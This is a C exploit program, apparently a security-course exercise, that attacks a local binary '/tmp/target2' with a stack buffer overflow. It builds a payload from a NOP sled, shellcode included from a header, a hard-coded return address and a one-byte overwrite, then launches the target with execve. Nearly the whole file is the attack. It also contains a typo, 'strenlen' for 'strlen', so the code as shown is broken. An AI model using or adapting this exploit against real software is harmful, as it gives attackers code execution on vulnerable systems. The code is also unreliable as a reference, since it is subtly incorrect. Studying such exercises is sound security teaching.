#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

int main(void)
{
  char *args[3];
  char *env[1];
  char evile[302];
  int i;
  int addr;
  addr = 0xbffffc0c;
  
  for(i = 0; i < 302; i++) {
    if(i < (296 - strlen(shellcode))) {
      *(evile + i) = '\x90';
    } else if(i < 296) {
      *(evile + i) = shellcode[i - 296 + strenlen(shellcode)];
    } else if(i < 300) {
      *(evile + i) = addr >> ((i - 296) * 8);
    } else if(i < 301) {
      *(evile + i) = '\x30';
    } else if(i < 302) {
      *(evile + i) = '\x00';
    }
  }

  args[0] = TARGET; args[1] = evile; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
